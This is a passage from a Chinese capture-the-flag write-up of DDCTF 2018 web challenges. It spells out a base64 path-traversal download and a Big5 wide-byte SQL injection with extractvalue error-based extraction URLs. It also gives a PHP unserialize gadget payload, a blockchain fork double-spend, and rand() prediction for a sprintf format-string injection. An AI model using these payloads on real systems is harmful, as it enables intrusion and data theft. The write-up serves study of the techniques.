src=\"/images/ddctf/201804211191034.png\" alt=\"avatar\"></p>\n</li>\n<li><p>_.._WEB-INF_classes_com_didichuxing_ctf_controller_user_StaticController.class,该文件的地址通过构造”116.85.48.102:5050/image/banner/[随便一个错误的地址]”或类似的链接使得网站报错即可得到。</p>\n<p><img src=\"/images/ddctf/20180421191037.png\" alt=\"avatar\"></p>\n</li>\n<li><p>_.._WEB-INF_classes_emails.txt<em>a__</em>,这个文件按理来说是无法下载的，不过我做题的时候，还是可以下载的，可以通过”116.85.48.102:5050/base64_encode(‘../../WEB-INF/classes/email.txt/a/../‘)”,(注意，base64_encode(‘../../WEB-INF/classes/email.txt/a/../‘)是个base64之后的字符串，我这里为了方便大家查看这么写的),就可以绕过了,是个非预期，过了几天，bug修补之后，就没办法下载了，里面的邮箱或者首页的邮箱其实都可以用，所以这个文件下载下不下都无所谓，可惜了，当时应该可以下载数据库的配置文件的，我因为拿到flag就忘记的这一茬，不然，说不定还能改别人的flag，当然我是不可能这么做滴~。</p>\n</li>\n</ul>\n<h2 id=\"审计代码\"><a href=\"#审计代码\" class=\"headerlink\" title=\"审计代码\"></a>审计代码</h2><p>下载下来的class文件，通过Intellij idea打开，就可以直接得到反编译之后的代码了。<br>其中最重要的两个文件是FlagController.class和InitListener.class。</p>\n<ul>\n<li>FlagController.class</li>\n</ul>\n<pre><code>public String getFlag(@PathVariable(&quot;email&quot;) String email, ModelMap model) {\n        Flag flag = this.flagService.getFlagByEmail(email);\n        return &quot;Encrypted flag : &quot; + flag.getFlag();\n    }\n</code></pre><p>在该文件中，可以得到一个获取加密后的flag的路由，需要一个邮箱，当然该邮箱也是加密之后的邮箱，如何加密邮箱，可以在InitListener.class中看到。</p>\n<ul>\n<li>InitListener.class</li>\n</ul>\n<pre><code>public void onApplicationEvent(ApplicationEvent event) {\n        if(event.getSource() instanceof ApplicationContext) {\n            WebApplicationContext ctx = (WebApplicationContext)event.getSource();\n            if(ctx.getParent() == null) {\n                String regenflag = this.properties.getProperty(&quot;regenflag&quot;);\n                if(regenflag != null &amp;&amp; &quot;false&quot;.equals(regenflag)) {\n                    System.out.println(&quot;skip gen flag&quot;);\n                } else {\n                    try {\n                        this.flagService.deleteAll();\n                        int id = 1;\n                        String path = ctx.getServletContext().getRealPath(&quot;/WEB-INF/classes/emails.txt&quot;);\n                        String ksPath = ctx.getServletContext().getRealPath(&quot;/WEB-INF/classes/sdl.ks&quot;);\n                        System.out.println(path);\n                        String emailsString = FileUtils.readFileToString(new File(path), &quot;utf-8&quot;);\n                        String[] emails = emailsString.trim().split(&quot;\\n&quot;);\n                        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n                        FileInputStream inputStream = new FileInputStream(ksPath);\n                        keyStore.load(inputStream, this.p.toCharArray());\n                        Key key = keyStore.getKey(&quot;www.didichuxing.com&quot;, this.p.toCharArray());\n                        Cipher cipher = Cipher.getInstance(key.getAlgorithm());\n                        cipher.init(1, key);\n                        SecretKeySpec signingKey = new SecretKeySpec(&quot;sdl welcome you !&quot;.getBytes(), &quot;HmacSHA256&quot;);\n                        Mac mac = Mac.getInstance(&quot;HmacSHA256&quot;);\n                        mac.init(signingKey);\n                        SecureRandom sr = new SecureRandom();\n                        String[] var16 = emails;\n                        int var17 = emails.length;\n\n                        for(int var18 = 0; var18 &lt; var17; ++var18) {\n                            String email = var16[var18];\n                            String flag = &quot;DDCTF{&quot; + Math.abs(sr.nextLong()) + &quot;}&quot;;\n                            String uuid = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;s&quot;);\n                            byte[] data = cipher.doFinal(flag.getBytes());\n                            byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());\n                            Flag flago = new Flag();\n                            flago.setId(Integer.valueOf(id));\n                            flago.setFlag(byte2hex(data));\n                            flago.setEmail(byte2hex(e));\n                            flago.setOriginFlag(flag);\n                            flago.setUuid(uuid);\n                            flago.setOriginEmail(email);\n                            this.flagService.save(flago);\n                            System.out.println(email + &quot;同学的入口链接为：http://116.85.48.102:5050/welcom/&quot; + uuid);\n                            ++id;\n                            System.out.println(flago);\n                        }\n                    } catch (KeyStoreException var25) {\n                        var25.printStackTrace();\n                    } catch (IOException var26) {\n                        var26.printStackTrace();\n                    } catch (NoSuchAlgorithmException var27) {\n                        var27.printStackTrace();\n                    } catch (CertificateException var28) {\n                        var28.printStackTrace();\n                    } catch (UnrecoverableKeyException var29) {\n                        var29.printStackTrace();\n                    } catch (NoSuchPaddingException var30) {\n                        var30.printStackTrace();\n                    } catch (InvalidKeyException var31) {\n                        var31.printStackTrace();\n                    } catch (IllegalBlockSizeException var32) {\n                        var32.printStackTrace();\n                    } catch (BadPaddingException var33) {\n                        var33.printStackTrace();\n                    }\n\n                }\n            }\n        }\n    }\n</code></pre><p>该文件中onApplicationEvent方法意思是，在应用启动之后，首先判断是否需要生成flag，如果需要生成flag，然后读取email.txt里边的邮箱一一加密，同时生成flag，并保存到数据库中。只要可以得到加密后的email.txt就可以获得加密后的flag，并通过相应的sdl.ks获取公钥，最终解密加密后的flag即可得到flag了。</p>\n<h2 id=\"获取flag\"><a href=\"#获取flag\" class=\"headerlink\" title=\"获取flag\"></a>获取flag</h2><ul>\n<li>生成加密的email，随便在email.txt中获取一条email，或者首页的邮箱。</li>\n</ul>\n<pre><code>public class cipher {\n    public static  void main(String[] args) throws Exception {\n        gencipher();\n//        String email = &quot;email&quot;;\n//        SecretKeySpec signingKey = new SecretKeySpec(&quot;sdl welcome you !&quot;.getBytes(), &quot;HmacSHA256&quot;);\n//        Mac mac = Mac.getInstance(&quot;HmacSHA256&quot;);\n//        mac.init(signingKey);\n//        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());\n//        System.out.println(byte2hex(e));\n    }\n\n    public static void gencipher() throws Exception {\n        String p = &quot;sdl welcome you !&quot;.substring(0, &quot;sdl welcome you !&quot;.length() - 1).trim().replace(&quot; &quot;, &quot;&quot;);\n        String ksPath = &quot;D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks&quot;;\n        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n        FileInputStream inputStream = new FileInputStream(ksPath);\n        keyStore.load(inputStream, p.toCharArray());\n//        Key key = keyStore.getKey(&quot;www.didichuxing.com&quot;, p.toCharArray());\n        Key key = keyStore.getCertificate(&quot;www.didichuxing.com&quot;).getPublicKey();\n        Cipher cipher = Cipher.getInstance(key.getAlgorithm());\n        cipher.init(2, key);\n        String flag = &quot;019312D7231329ADEB986C6F994D7148B74AF9282B515F80F58A88BCE863F8848600CA69C4BE8F0D3BE3486B4FB7445C15169085F1DFE4D4B8439EF3472B50DE22D6E09BCCBC56542541D0C8F148B658005C2DD89202AEBF765998C2FA6AA197E5F6277587E78498F7E0A111429D3E1BEE2F4DD17224C0599FFA2FC1EE69B2521EEB96859EEB3D65DA88FED274739B208A81AF6280CF233B2064C6DB513AB9D53B010A456B8073C8C950E29034628C957108E7173390FBB4665229A6A9949188C8A5D43AE7CDB6244F082EF90EB3D2E126764CF90DE716A2150652AE3C13C0B457BD76E9BF1F9936AD85474CEDB23472039B5EC3387EF4FB5D5E3BD0FA681CDE&quot;;\n        byte[] data = cipher.doFinal(hexStringToBytes(flag));\n        System.out.println(new String(data));\n    }\n\n    public static String byte2hex(byte[] b) {\n        StringBuilder hs = new StringBuilder();\n\n        for(int n = 0; b != null &amp;&amp; n &lt; b.length; ++n) {\n            String stmp = Integer.toHexString(b[n] &amp; 255);\n            if(stmp.length() == 1) {\n                hs.append(&#39;0&#39;);\n            }\n\n            hs.append(stmp);\n        }\n\n        return hs.toString().toUpperCase();\n    }\n\n    public static byte[] hexStringToBytes(String hexString) {\n        if (hexString == null || hexString.equals(&quot;&quot;)) {\n            return null;\n        }\n        hexString = hexString.toUpperCase();\n        int length = hexString.length() / 2;\n        char[] hexChars = hexString.toCharArray();\n        byte[] d = new byte[length];\n        for (int i = 0; i &lt; length; i++) {\n            int pos = i * 2;\n            d[i] = (byte) (charToByte(hexChars[pos]) &lt;&lt; 4 | charToByte(hexChars[pos + 1]));\n        }\n        return d;\n    }\n\n    private static byte charToByte(char c) {\n        return (byte) &quot;0123456789ABCDEF&quot;.indexOf(c);\n    }\n}\n</code></pre><p>通过这几行代码就可以获得一个加密后的邮箱了,邮箱使用首页展示的邮箱就行。</p>\n<pre><code>//        String email = &quot;email&quot;;\n//        SecretKeySpec signingKey = new SecretKeySpec(&quot;sdl welcome you !&quot;.getBytes(), &quot;HmacSHA256&quot;);\n//        Mac mac = Mac.getInstance(&quot;HmacSHA256&quot;);\n//        mac.init(signingKey);\n//        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());\n//        System.out.println(byte2hex(e));\n</code></pre><p>拿到该加密后的邮箱，就可以获得加密后的flag。</p>\n<p> <img src=\"/images/ddctf/20180421191047.png\" alt=\"avatar\"></p>\n<p>拿到加密之后的flag之后，就可以解密了。</p>\n<pre><code>public static void gencipher() throws Exception {\n        String p = &quot;sdl welcome you !&quot;.substring(0, &quot;sdl welcome you !&quot;.length() - 1).trim().replace(&quot; &quot;, &quot;&quot;);\n        String ksPath = &quot;D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks&quot;;\n        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n        FileInputStream inputStream = new FileInputStream(ksPath);\n        keyStore.load(inputStream, p.toCharArray());\n        Key key = keyStore.getCertificate(&quot;www.didichuxing.com&quot;).getPublicKey();\n        Cipher cipher = Cipher.getInstance(key.getAlgorithm());\n        cipher.init(2, key);\n        String flag = &quot;019312D7231329ADEB986C6F994D7148B74AF9282B515F80F58A88BCE863F8848600CA69C4BE8F0D3BE3486B4FB7445C15169085F1DFE4D4B8439EF3472B50DE22D6E09BCCBC56542541D0C8F148B658005C2DD89202AEBF765998C2FA6AA197E5F6277587E78498F7E0A111429D3E1BEE2F4DD17224C0599FFA2FC1EE69B2521EEB96859EEB3D65DA88FED274739B208A81AF6280CF233B2064C6DB513AB9D53B010A456B8073C8C950E29034628C957108E7173390FBB4665229A6A9949188C8A5D43AE7CDB6244F082EF90EB3D2E126764CF90DE716A2150652AE3C13C0B457BD76E9BF1F9936AD85474CEDB23472039B5EC3387EF4FB5D5E3BD0FA681CDE&quot;;\n        byte[] data = cipher.doFinal(hexStringToBytes(flag));\n        System.out.println(new String(data));\n    }\n</code></pre><p>该加密是RSA加密，需要拿到公钥才行，公钥的话，只需要通过以下代码就可</p>\n<pre><code>String ksPath = &quot;D:\\\\java\\\\ddctf\\\\src\\\\main\\\\java\\\\sdl.ks&quot;;\nKeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\nFileInputStream inputStream = new FileInputStream(ksPath);\nkeyStore.load(inputStream, p.toCharArray());\nKey key = keyStore.getCertificate(&quot;www.didichuxing.com&quot;).getPublicKey();\n</code></pre><p>然后就可以解密得到flag.</p>\n<blockquote>\n<p>DDCTF{5218295657878818503}</p>\n</blockquote>\n<h1 id=\"注入的奥妙\"><a href=\"#注入的奥妙\" class=\"headerlink\" title=\"注入的奥妙\"></a>注入的奥妙</h1><h2 id=\"sql注入\"><a href=\"#sql注入\" class=\"headerlink\" title=\"sql注入\"></a>sql注入</h2><p>首先，测试单引号，双引号，会发现均会被转义，然后%df，直接就没反应了，过了一会，输了一个中文的单引号”‘“，发现输出竟然乱码。</p>\n<p> <img src=\"/images/ddctf/20180421195946.png\" alt=\"avatar\"></p>\n<p> 然后就输入了几个中文，发现还是乱码，只有输入英文才没有乱码，应该是后台进行了编码转换。</p>\n<p> <img src=\"/images/ddctf/20180421200130.png\" alt=\"avatar\"></p>\n<p> 于是便测试了一下是什么编码，经过测试，发现是Big5编码，后来发现题目在源码里边给出了提示链接（<a href=\"https://wenku.baidu.com/view/bd29b7b3fd0a79563c1e72f7.html)可惜做题时没看到。\" target=\"_blank\" rel=\"noopener\">https://wenku.baidu.com/view/bd29b7b3fd0a79563c1e72f7.html)可惜做题时没看到。</a></p>\n<p> <img src=\"/images/ddctf/20180421200307.png\" alt=\"avatar\"></p>\n<p> 我选择了”么”</p>\n<p> <img src=\"/images/ddctf/20180421200748.png\" alt=\"avatar\"></p>\n<p> 通过测试”<a href=\"http://116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/well/getmessage/%E4%B9%88&#39;&quot;，可以看到单引号成功逃逸。\" target=\"_blank\" rel=\"noopener\">http://116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/well/getmessage/%E4%B9%88&#39;&quot;，可以看到单引号成功逃逸。</a></p>\n<pre><code>\n 最后拼接的参数是 : ?\\\\&#39;\n​~~~如果自己拼接的参数显示有问题了，试试浏览器的页面编码设置~~~\n很遗憾没有找到数据 可以试试别的 ！\n42000 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;?\\\\&#39;&#39;&#39; at line 1\n</code></pre><p>单引号成功逃逸，然后就是简单的sql注入获取数据了，报错注入或者直接获取数据均可，还是手工,这里需要注意，部分字符串被过滤，只要双写绕过就行，同时由于编码的原因，直接获取数据的话，会报错编码有问题，我感觉应该就是这原因，出题人把错误展示出来了，需要编码不同的地方添加”collate utf8_general_cli”,强制转换编码即可。</p>\n<ul>\n<li>获取数据库。<a href=\"http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1%E4%B9%88&#39;%20uniunionon%20select%201,2,extracextractvaluetvalue(1,%20concat(0x3a,%20dadatabasetabase(),%200x3a))%23\" target=\"_blank\" rel=\"noopener\">http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1%E4%B9%88&#39;%20uniunionon%20select%201,2,extracextractvaluetvalue(1,%20concat(0x3a,%20dadatabasetabase(),%200x3a))%23</a><br> 得到结果”sqli”</li>\n<li>获取’sqli’下的table。<a href=\"http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么\" target=\"_blank\" rel=\"noopener\">http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么</a>‘ uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(table_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23<br> 得到结果”message,route_rules”</li>\n<li>获取”route_rules”的列名。<a href=\"http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么\" target=\"_blank\" rel=\"noopener\">http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么</a>‘ uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(column_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23<br> 得到结果”id,pattern,action,rulepass”</li>\n<li>然后获取route_rules表中的数据。<br> 数据如下:<br> 1   get<em>/   u/well/getmessage/<br> 12  get</em>/   u/justtry/self/<br> 13  post*/  u/justtry/try<br> 15  static/bootstrap/css/backup.css static/bootstrap/css/backup.zip</li>\n</ul>\n<h2 id=\"代码审计\"><a href=\"#代码审计\" class=\"headerlink\" title=\"代码审计\"></a>代码审计</h2><p>通过上边的”116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/static/bootstrap/css/backup.css”，可以拿到代码。</p>\n<ul>\n<li>Jusstry.php</li>\n</ul>\n<pre><code>public function try($serialize)\n{\n    unserialize(urldecode($serialize), [&quot;allowed_classes&quot; =&gt; [&quot;Index\\Helper\\Flag&quot;, &quot;Index\\Helper\\SQL&quot;,&quot;Index\\Helper\\Test&quot;]]);\n}\n</code></pre><p>通过这段代码，可以看到使用了unserialize()方法，可能存在反序列化漏洞。</p>\n<ul>\n<li>Flag.php</li>\n</ul>\n<pre><code>&lt;?php\nnamespace Index\\Helper;\n\nuse PDO;\nuse Index\\Helper\\SQL;\n\ndefined(&#39;ACCESS_FILE&#39;) or exit(&#39;No direct script access allowed&#39;);\nclass Flag\n{\n    public $sql;\n\n    //\n    public function __construct()\n    {\n        $this-&gt;sql=new SQL();\n    }\n\n    //\n    public function get($user)\n    {\n\n        $tmp=$this-&gt;sql-&gt;FlagGet($user);\n        if ($tmp[&#39;status&#39;]===1) {\n            return $this-&gt;sql-&gt;FlagGet($user)[&#39;flag&#39;];\n        }\n    }\n}\n</code></pre><p>该类说明只要调用get方法就可以得到指定用户的flag。</p>\n<ul>\n<li>Test.php</li>\n</ul>\n<pre><code>class Test\n{\n\n    public $user_uuid = &quot;4f5aa917-e388-4aa5-bcdc-125b9b95e12a&quot;;\n    public $fl;\n\n    public function __construct()\n    {\n        echo &#39;hhkjjhkhjkhjkhkjhkhkhk&#39;;\n        $this-&gt;fl = new Flag();\n    }\n\n    public function __destruct()\n    {\n        $this-&gt;getflag(&#39;ctfuser&#39;, $this-&gt;user_uuid);\n    }\n\n    public function setflag($m = &#39;ctfuser&#39;, $u = &#39;default&#39;, $o = &#39;default&#39;)\n    {\n        $user=array(\n            &#39;name&#39; =&gt; $m,\n            &#39;oldid&#39; =&gt; $o,\n            &#39;id&#39; =&gt; $u\n        );\n        // var_dump($user);\n\n        echo $this-&gt;fl-&gt;set($user, 2);\n    }\n\n    public function getflag($m = &#39;ctfuser&#39;, $u = &#39;default&#39;)\n    {\n        //TODO: check username\n        $user=array(\n            &#39;name&#39; =&gt; $m,\n            &#39;id&#39; =&gt; $u\n        );\n        //懒了直接输出给你们了\n        echo &#39;DDCTF{&#39;.$this-&gt;fl-&gt;get($user).&#39;}&#39;;\n    }\n}\n</code></pre><p>在Test类中，可以看到调用了__destruct()方法，并且该方法调用了getflag方法。这样，只需要构造一个Test类，并令$f1=new Flag(),$user_uuid=”4f5aa917-e388-4aa5-bcdc-125b9b95e12a”，然后序列化，然后就可以获得flag了，需要注意的是，Flag.php中的$sql也是需要赋值的。</p>\n<pre><code>&lt;?php\nnamespace Index\\Helper;\n\nuse Index\\Helper\\Flag;\nuse Index\\Helper\\UUID;\n\nclass SQL\n{\n    public $dbc;\n    public $pdo;\n\n    //\n    public function __construct()\n    {\n    }\n}\n\nclass Flag\n{\n    public $sql;\n\n    //\n    public function __construct()\n    {\n        $this-&gt;sql=new SQL();\n    }\n}\n\n\n// defined(&#39;ACCESS_FILE&#39;) or exit(&#39;No direct script access allowed&#39;);\nclass Test\n{\n\n    public $user_uuid = &quot;4f5aa917-e388-4aa5-bcdc-125b9b95e12a&quot;;\n    public $fl;\n\n    public function __construct()\n    {\n        echo &#39;hhkjjhkhjkhjkhkjhkhkhk&#39;;\n        $this-&gt;fl = new Flag();\n    }\n\n    public function __destruct()\n    {\n        // $this-&gt;getflag(&#39;ctfuser&#39;, $this-&gt;user_uuid);\n    }\n}\n\necho serialize(new Test());\n</code></pre><p>即可得到序列化之后的值:”hhkjjhkhjkhjkhkjhkhkhkO:17:”Index\\Helper\\Test”:2:{s:9:”user_uuid”;s:36:”4f5aa917-e388-4aa5-bcdc-125b9b95e12a”;s:2:”fl”;O:17:”Index\\Helper\\Flag”:1:{s:3:”sql”;O:16:”Index\\Helper\\SQL”:2:{s:3:”dbc”;N;s:3:”pdo”;N;}}}”,然后就可以得到flag了。</p>\n<p> <img src=\"/images/ddctf/20180421150038.png\" alt=\"avatar\"></p>\n<h1 id=\"mini-blockchain\"><a href=\"#mini-blockchain\" class=\"headerlink\" title=\"mini blockchain\"></a>mini blockchain</h1><h2 id=\"构造符合条件的区块\"><a href=\"#构造符合条件的区块\" class=\"headerlink\" title=\"构造符合条件的区块\"></a>构造符合条件的区块</h2><pre><code>import json\nimport hashlib\nfrom itertools import product\nimport string\nfrom functools import reduce\nimport rsa\n\nEMPTY_HASH = &#39;0&#39; * 64\n\ndef hash(x):\n    return hashlib.sha256(hashlib.md5(x.encode()).digest()).hexdigest()\n\n\ndef hash_reducer(x, y):\n    return hash(hash(x) + hash(y))\n\n\ndef hash_block(block):\n    return reduce(hash_reducer, [block[&#39;prev&#39;], block[&#39;nonce&#39;],\n                                 reduce(hash_reducer, [tx[&#39;hash&#39;] for tx in block[&#39;transactions&#39;]], EMPTY_HASH)])\n\nblock = {\n    &quot;nonce&quot;: &quot;6h0F&quot;,\n    &quot;prev&quot;: &quot;0000031ffd8d820cfaef0a73a76dabee62cfce8922e929df101eba4d2c400be8&quot;,\n    &quot;transactions&quot;: []\n  }\n\nc = string.ascii_lowercase + &quot;0123456789ABCDEFGHI&quot;\n\ncaptchas = [&#39;&#39;.join(i) for i in product(c, repeat=4)]\n\nprint(&#39;[+] Genering {} captchas...&#39;.format(len(captchas)))\nwith open(&#39;captchas.txt&#39;, &#39;w&#39;) as f:\n    for k in captchas:\n        block[&quot;nonce&quot;] = k\n        f.write(hash_block(block)[:5] + &#39; --&gt; &#39; + k + &#39;\\n&#39;)\n</code></pre><p>“nonce”值是可控的，所有只要有修改nonce就可以生成任意的符合条件的区块。</p>\n<h2 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h2><p>初始区块链如图所示:</p>\n<p> <img src=\"/images/ddctf/20180421221550.png\" alt=\"avatar\"></p>\n<p>然后，通过find_block_chain_tail方法，可以知道，该区块链是根据block[‘height’]来判断最后一个区块链，如果构造一个更长的区块链，那么就可以控制整个区块链。</p>\n<pre><code>def find_blockchain_tail():\n    return max(session[&#39;blocks&#39;].values(), key=lambda block: block[&#39;height&#39;])\n</code></pre><p> <img src=\"/images/ddctf/20180421222032.png\" alt=\"avatar\"></p>\n<p>从上边的图可以看到，如果构造3个区块，（事实上，也有一定的概率，创建两个区块就行了），那么最后一个区块就是区块6，这时候，一切都回到起点，银行又有了1000000，然后就可以转账，转账之后，在创建一个区块，就可以拿到第一个钻石,如图所示。</p>\n<p> <img src=\"/images/ddctf/20180421222814.png\" alt=\"avatar\"></p>\n<p>接下来，来获取第二个钻石。这时候，只需要在区块7之后继续创建空的区块就行了。这样，shop又有了1000000，又可以买一个钻石，然后就可以拿到flag了。</p>\n<p> <img src=\"/images/ddctf/20180421223014.png\" alt=\"avatar\"></p>\n<p>需要注意的是，flask是客户端session，区块多了之后，cookie也会变得很大，由于浏览器cookie是有限制的，这样，当set-cookie的值过大的时候，就会出现set-cookie失败的情况，所以这道题最好使用脚本发包。</p>\n<h1 id=\"我的博客\"><a href=\"#我的博客\" class=\"headerlink\" title=\"我的博客\"></a>我的博客</h1><h2 id=\"审计代码-1\"><a href=\"#审计代码-1\" class=\"headerlink\" title=\"审计代码\"></a>审计代码</h2><p>根据提示，下载www.tar.gz,里边共有三个文件，index.php, login.php, register.php。</p>\n<h3 id=\"index-php\"><a href=\"#index-php\" class=\"headerlink\" title=\"index.php\"></a>index.php</h3><pre><code>if(isset($_GET[&#39;id&#39;])){\n    $id = addslashes($_GET[&#39;id&#39;]);\n    if(isset($_GET[&#39;title&#39;])){\n        $title = addslashes($_GET[&#39;title&#39;]);\n        $title = sprintf(&quot;AND title=&#39;%s&#39;&quot;, $title);\n    }else{\n        $title = &#39;&#39;;\n    }\n    $sql = sprintf(&quot;SELECT * FROM article WHERE id=&#39;%s&#39; $title&quot;, $id);\n\n    foreach ($pdo-&gt;query($sql) as $row) {\n        echo &quot;&lt;h1&gt;&quot;.$row[&#39;title&#39;].&quot;&lt;/h1&gt;&lt;br&gt;&quot;.$row[&#39;content&#39;];\n        die();\n    }\n}\n</code></pre><p>可以看到该地方使用了两次sprintf，可以立马想到<a href=\"https://paper.seebug.org/386/\" target=\"_blank\" rel=\"noopener\">从WordPress SQLi谈PHP格式化字符串问题</a>,问题就是，需要以admin的身份登录。</p>\n<h3 id=\"login-php\"><a href=\"#login-php\" class=\"headerlink\" title=\"login.php\"></a>login.php</h3><pre><code>if($_SERVER[&#39;REQUEST_METHOD&#39;] === &quot;POST&quot;) {\n    if(!(isset($_POST[&#39;csrf&#39;]) and (string)$_POST[&#39;csrf&#39;] === $_SESSION[&#39;csrf&#39;])) {\n        die(&quot;CSRF token error!&quot;);\n    }\n\n    $username = (isset($_POST[&#39;username&#39;]) === true &amp;&amp; $_POST[&#39;username&#39;] !== &#39;&#39;) ? (string)$_POST[&#39;username&#39;] : die(&#39;Missing username&#39;);\n    $password = (isset($_POST[&#39;password&#39;]) === true &amp;&amp; $_POST[&#39;password&#39;] !== &#39;&#39;) ? (string)$_POST[&#39;password&#39;] : die(&#39;Missing password&#39;);\n\n    if (strlen($username) &gt; 32 || strlen($password) &gt; 32) {\n        die(&#39;Invalid input&#39;);\n    }\n\n    $sth = $pdo-&gt;prepare(&#39;SELECT password FROM users WHERE username = :username&#39;);\n    $sth-&gt;execute([&#39;:username&#39; =&gt; $username]);\n\n    if ($sth-&gt;fetch()[0] !== $password) {\n        die(&#39;wrong password&#39;);\n    }\n\n    $sth = $pdo-&gt;prepare(&#39;SELECT `identity` FROM users WHERE username = :username&#39;);\n    $sth-&gt;execute([&#39;:username&#39; =&gt; $username]);\n\n    if ($sth-&gt;fetch()[0] === &quot;admin&quot;) {\n        $_SESSION[&#39;is_admin&#39;] = true;\n    } else {\n        $_SESSION[&#39;is_admin&#39;] = false;\n    }\n\n    #echo $username;\n    header(&quot;Location: index.php&quot;);\n}\n</code></pre><p>login部分使用pdo进行查询，并且字符串之间的比较也是”===”，不可能存在任何漏洞。</p>\n<h3 id=\"register-php\"><a href=\"#register-php\" class=\"headerlink\" title=\"register.php\"></a>register.php</h3><pre><code>if(!(isset($_POST[&#39;csrf&#39;]) and (string)$_POST[&#39;csrf&#39;] === $_SESSION[&#39;csrf&#39;])) {\n        die(&quot;CSRF token error!&quot;);\n    }\n\n    $admin = &quot;admin###&quot; . substr(str_shuffle(&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;), 0, 32);\n    $username = (isset($_POST[&#39;username&#39;]) === true &amp;&amp; $_POST[&#39;username&#39;] !== &#39;&#39;) ? (string)$_POST[&#39;username&#39;] : die(&#39;Missing username&#39;);\n    $password = (isset($_POST[&#39;password&#39;]) === true &amp;&amp; $_POST[&#39;password&#39;] !== &#39;&#39;) ? (string)$_POST[&#39;password&#39;] : die(&#39;Missing password&#39;);\n    $code = (isset($_POST[&#39;code&#39;]) === true) ? (string)$_POST[&#39;code&#39;] : &#39;&#39;;\n    if (strlen($username) &gt; 32 || strlen($password) &gt; 32) {\n        die(&#39;Invalid input&#39;);\n    }\n\n    $sth = $pdo-&gt;prepare(&#39;SELECT username FROM users WHERE username = :username&#39;);\n    $sth-&gt;execute([&#39;:username&#39; =&gt; $username]);\n\n    if ($sth-&gt;fetch() !== false) {\n        die(&#39;username has been registered&#39;);\n    }\n\n    if($code === $admin) {\n        $identity = &quot;admin&quot;;\n    } else {\n        $identity = &quot;guest&quot;;\n    }\n\n    $sth = $pdo-&gt;prepare(&#39;INSERT INTO users (username, password, `identity`) VALUES (:username, :password, :identity)&#39;);\n    $sth-&gt;execute([&#39;:username&#39; =&gt; $username, &#39;:password&#39; =&gt; $password, &#39;:identity&#39; =&gt; $identity]);\n\n    echo &#39;&lt;script&gt;alert(&quot;register success&quot;);location.href=&quot;./login.php&quot;&lt;/script&gt;&#39;;\n} else {\n</code></pre><p>register部分，使用str_shuffle生成admin密码，同时给出rand()来作为csrf值。</p>\n<pre><code>&lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; id=&quot;csrf&quot; value=&quot;&lt;?php $_SESSION[&#39;csrf&#39;] = (string)rand();echo $_SESSION[&#39;csrf&#39;]; ?&gt;&quot; required&gt;\n&lt;label for=&quot;inputUsername&quot; class=&quot;sr-only&quot;&gt;Username&lt;/label&gt;\n</code></pre><p>可以想到乌云的一篇文章，也是翻译自国外，原文可以自己找<a href=\"https://wooyun.js.org/drops/Web%E5%BA%94%E7%94%A8%E9%9A%90%E5%BD%A2%E5%90%8E%E9%97%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0.html\" target=\"_blank\" rel=\"noopener\">Web应用隐形后门的设计与实现</a>。这样的话，就可以明确思路，首先通过预测rand()值，来预测密码，在使用该密码注册一个账号，进入博客，然后通过sprintf格式化漏洞获取flag。</p>\n<h2 id=\"解题-1\"><a href=\"#解题-1\" class=\"headerlink\" title=\"解题\"></a>解题</h2><p>现在关键就是预测rand()值，通过google，可以找到0ctf2016,有相似的题目，<a href=\"http://www.vuln.cn/6004\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/6004</a>,文中提到，只要有大于等于32个连续的rand()随机数，就可以大概预测接下来rand()的值。</p>\n<pre><code>#!php\nstate[i] = state[i-3] + state[i-31]\nreturn state[i] % 2147483648\n</code></pre><p>同时，需要知道一定要使用 requests.session来keep-alive，否则的话，获得的rand()值并不是连续的，也就不满足上面的公式了。</p>\n<p>此外，在获得超过32个rand()值之后，并预测到接下来的62个rand()之后，还需要重新实现str_shuffle函数。通过阅读php源码，可以找到str_shuffle函数的实现。</p>\n<pre><code>static void php_string_shuffle(char *str, long len TSRMLS_DC) /* {{{ */\n{\n    long n_elems, rnd_idx, n_left;\n    char temp;\n    /* The implementation is stolen from array_data_shuffle       */\n    /* Thus the characteristics of the randomization are the same */\n    n_elems = len;\n\n    if (n_elems &lt;= 1) {\n        return;\n    }\n\n    n_left = n_elems;\n\n    while (--n_left) {\n        rnd_idx = php_rand(TSRMLS_C);\n        RAND_RANGE(rnd_idx, 0, n_left, PHP_RAND_MAX);\n        if (rnd_idx != n_left) {\n            temp = str[n_left];\n            str[n_left] = str[rnd_idx];\n            str[rnd_idx] = temp;\n        }\n    